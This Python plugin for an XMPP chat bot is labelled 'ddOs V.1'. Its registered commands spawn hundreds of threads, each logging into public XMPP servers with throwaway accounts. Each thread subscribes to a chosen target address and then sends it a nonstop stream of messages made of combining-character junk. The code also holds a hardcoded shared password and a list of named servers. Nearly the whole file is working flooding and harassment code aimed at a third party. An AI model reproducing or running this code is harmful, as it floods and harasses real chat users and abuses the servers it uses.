# -*- coding: utf-8 -*-
#############################
###*ddOs V.1|*   ###        *
#############################
## daa@xmpp.ru ##
#################


import os, xmpp, time, sys, time, pdb, urllib, threading, types, random
LASTSPAM1 = {}
TIME_SJID = {'work': 0,'run': 0,'work2': 0,'run2': 0}
Spamjid2_servers = ['syriatalk.org','jsmart.web.id']
Spamjid1_servers = ['syriatalk.org','jsmart.web.id']


def spam_stop(type,source,parameters):
  if TIME_SJID['work']!=0:
    TIME_SJID['work']=0
    reply(type,source,u'Ok')
    return
  else:
    reply(type,source,u'not active')

def spam2_stop(type,source,parameters):
  if TIME_SJID['work2']!=0:
    TIME_SJID['work2']=0
    reply(type,source,u'Ok')
    return
  else:
    reply(type,source,u'not active')
    
def spamjid_go(type,source,parameters):
  if TIME_SJID['work']!=1:
    TIME_SJID['work']=1
  threading.Thread(None, handler_sp_time, 'at'+str(random.randrange(0, 999)), (type, source)).start()
  reply(type,source,'Ok')
  s= parameters.split()
  n=0
  if parameters.count(' ')>0:
    n= int(s[1])
  if parameters.count(' ')==0:
    n=200
  if n>300:
    reply(type,source,u'Max number = 200')
    return
  p= s[0]
  for x in range(0, n):
    threading.Thread(None, handler_run_spamjid, 'at'+str(random.randrange(0, 999)), (type, source, p, n)).start()

def spamjid2_go(type,source,parameters):
  if TIME_SJID['work2']!=1:
    TIME_SJID['work2']=1
  threading.Thread(None, handler_sp2_time, 'at'+str(random.randrange(0, 999)), (type, source)).start()
  reply(type,source,'Ok')
  s= parameters.split()
  n=0
  if parameters.count(' ')>0:
    n= int(s[1])
  if parameters.count(' ')==0:
    n=100
  if n>200:
    reply(type,source,u'Max number = 200')
    return
  p= s[0]
  for x in range(0, n):
    threading.Thread(None, handler_run_spamjid2, 'at'+str(random.randrange(0, 999)), (type, source, p, n)).start()

def handler_sp_time(type,source):
  time.sleep(600)
  TIME_SJID['work']=0

def handler_sp2_time(type,source):
  time.sleep(600)
  TIME_SJID['work2']=0


def handler_run_spamjid(type,source,parameters,n):
  ree = parameters.lower()
  if not ree.count(u'@') > 0 or not ree.count(u'.') > 0:
    reply(type,source,u'I need jid')
    return
  if ree in ADMINS:
    reply(type,source,u'this jid in my admin list, i can\'t spam my admin!!')
    return
  if not LASTSPAM1.has_key(get_true_jid(source[1]+'/'+source[2])):
    LASTSPAM1[get_true_jid(source[1]+'/'+source[2])] = {'timesend':time.time(), 'count':1}
  if LASTSPAM1.has_key(get_true_jid(source[1]+'/'+source[2])):
    if int(user_level(source[1]+'/'+source[2], source[1]))<9 and time.time() - LASTSPAM1[get_true_jid(source[1]+'/'+source[2])]['timesend'] <= 60:
      reply(type,source,u'access denied!')
      return
    else:
      LASTSPAM1[get_true_jid(source[1]+'/'+source[2])]['timesend'] = time.time()
      LASTSPAM1[get_true_jid(source[1]+'/'+source[2])]['count'] += 1
  gserv = random.choice(Spamjid1_servers)
  bvc = 'run-'+str(random.randrange(00, 116))+''
  name, domain, password, newBotJid, mainRes = bvc, gserv, '590590', 0,'ddOs_'+str(random.randrange(00, 50))+''
  node = unicode(name)
  lastnick = name
  jid = xmpp.protocol.JID(node=node, domain=domain, resource=mainRes)
  psw = u''
  cl = xmpp.Client(jid.getDomain(), debug=[])
  cl.connect()
  print u'jid: '+unicode(jid.getNode())+'@'+unicode(domain)
  cl.auth(jid.getNode(), password, jid.getResource())
  cl.sendInitPresence()
  TIME_SJID['run']+=1
  if TIME_SJID['run']==n:
    reply(type,source,u'registered ('+unicode(TIME_SJID['run'])+u') jid\'s')
  try:
    rostget = cl.getRoster()
    rostget.Subscribe(unicode(parameters))
  except:
    pass
  spame_jid_start(type,source,parameters,cl)

def handler_run_spamjid2(type,source,parameters,n):
  ree = parameters.lower()
  if not ree.count(u'@') > 0 or not ree.count(u'.') > 0:
    reply(type,source,u'I need jid')
    return
  if ree in ADMINS:
    reply(type,source,u'this jid in my admin list, i can\'t spam my admin!!')
    return
  if not LASTSPAM1.has_key(get_true_jid(source[1]+'/'+source[2])):
    LASTSPAM1[get_true_jid(source[1]+'/'+source[2])] = {'timesend':time.time(), 'count':1}
  if LASTSPAM1.has_key(get_true_jid(source[1]+'/'+source[2])):
    if int(user_level(source[1]+'/'+source[2], source[1]))<9 and time.time() - LASTSPAM1[get_true_jid(source[1]+'/'+source[2])]['timesend'] <= 60:
      reply(type,source,u'access denied!')
      return
    else:
      LASTSPAM1[get_true_jid(source[1]+'/'+source[2])]['timesend'] = time.time()
      LASTSPAM1[get_true_jid(source[1]+'/'+source[2])]['count'] += 1
  gserv2 = random.choice(Spamjid2_servers)
  bvc2 = 'run-'+str(random.randrange(00, 16))+''
  name, domain, password, newBotJid, mainRes = bvc2, gserv2, '590590', 0,'ddOS_'+str(random.randrange(00, 40))+''
  node = unicode(name)
  lastnick = name
  jid = xmpp.protocol.JID(node=node, domain=domain, resource=mainRes)
  psw = u''
  cl = xmpp.Client(jid.getDomain(), debug=[])
  cl.connect()
  print u'jid: '+unicode(jid.getNode())+'@'+unicode(domain)
  cl.auth(jid.getNode(), password, jid.getResource())
  cl.sendInitPresence()
  TIME_SJID['run2']+=1
  if TIME_SJID['run2']==n:
    reply(type,source,u'Spammers:  ('+unicode(TIME_SJID['run2'])+u') jid\'s')
  try:
    rostget = cl.getRoster()
    rostget.Subscribe(unicode(parameters))
  except:
    pass
  spame_jid2_start(type,source,parameters,cl)
  
def spame_jid_start(type,source,parameters,cl):
  time.sleep(0)
  while TIME_SJID['work']==1:
    try:
      gen = '\n⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢'
      cl.send(xmpp.protocol.Message(parameters,gen,'chat'))
    except (IOError,AttributeError):
      pass

def spame_jid2_start(type,source,parameters,cl):
  time.sleep(0)
  while TIME_SJID['work2']==1:
    try:
      gen = '\n⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ ⃟ ⃢ '
      cl.send(xmpp.protocol.Message(parameters,gen,'chat'))
    except (IOError,AttributeError):
      pass
  


register(spamjid_go, Prefix+'spam-jid1', 9)
register(spam_stop, Prefix+'stop', 9)
register(spamjid2_go, Prefix+'spam-jid2', 9)
register(spam2_stop, Prefix+'stop', 9)
